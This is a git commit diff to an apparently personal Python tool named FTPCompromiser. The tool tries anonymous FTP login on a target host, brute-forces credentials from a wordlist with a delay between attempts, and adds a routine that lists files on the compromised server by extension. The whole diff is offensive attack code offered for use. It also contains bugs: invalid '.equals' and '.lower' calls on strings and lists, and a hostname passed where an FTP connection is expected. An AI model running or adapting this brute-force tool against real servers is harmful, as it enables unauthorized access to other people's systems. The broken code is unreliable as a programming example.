7b36dbd2ff05f1ed8849d90480033ff32a911621
joshua graham <joshscottgraham@gmail.com>
2020-10-26 11:59:33 +0000

    Added ability to display contents of ftp server if attacker gains access
    todo: Add comments

--- FTPCompromiser/FTPCompromiser.py
+++ FTPCompromiser/FTPCompromiser.py
@@ -1,4 +1,5 @@
 import ftplib
+import time
 from os import truncate
 
 
@@ -16,6 +17,7 @@ def anonymousLogin(targetHostname):
 def forceLogin(targetHostname, credentialsFile):
     creds = open(credentialsFile, 'r')
     for line in creds.readlines():
+        time.sleep(1)
         username = line.split(':')[0]
         password = line.split(':')[1].strip('\r').strip('\n')
         print("[+] Trying: "+username + " : "+password)
@@ -31,24 +33,42 @@ def forceLogin(targetHostname, credentialsFile):
     print("\n[ - ] Unable to bruteforce any FTP login credentials from given list")
     return(None, None)
 
+def displayContents(ftpconnection, extentions):
+    try:
+        directoryList = ftpconnection.nlst()
+    except:
+        directoryList = []
+        print("[ - ] Unable to list contents of main directory...")
+        print("[ - ] Moving to next Target.")
+        return
+    
+    if(extentions.equals("")):
+        for fileName in directoryList.lower():
+            print(fileName)
+    else:
+        for ext in extentions:
+            for fileName in directoryList.lower():
+                if(ext in fileName):
+                    print("File found matching extention requirement: "+fileName + "matching: "+ext+"\n")
 
+import argparse
+parser = argparse.ArgumentParser(description="Check FTP connections for anonymous login and brute force login")
+parser.add_argument("-t","--TargetHost", metavar="targetHost", type=str,required=True, help="TargetHost address")
+parser.add_argument("-w", "--wordlist", metavar="credentialWordlist", type=str, required=True, help="Credential Wordlist")
+parser.add_argument("-x", "--extentions", metavar="extentions", type=str, required=False, help="desired extentions")
 
+args = parser.parse_args()
 
+target = args.TargetHost
+file = args.wordlist
 
+if(args.extentions == ""):
+    extentions = ""
+else:
+    extentions = args.extentions
 
-
-
-
-
-
-
-
-
-
-
-
-# Make host and creds file reference user input
-host = 1234
-credentialsFile = "creds.txt"
-anonymousLogin(host)
-forceLogin(host, credentialsFile)
+print("[+] Trying anonymous login... \n")
+anonymousLogin(target)
+print("[+] Starting to brute force... \n")
+forceLogin(target, file)
+displayContents(target, extentions)
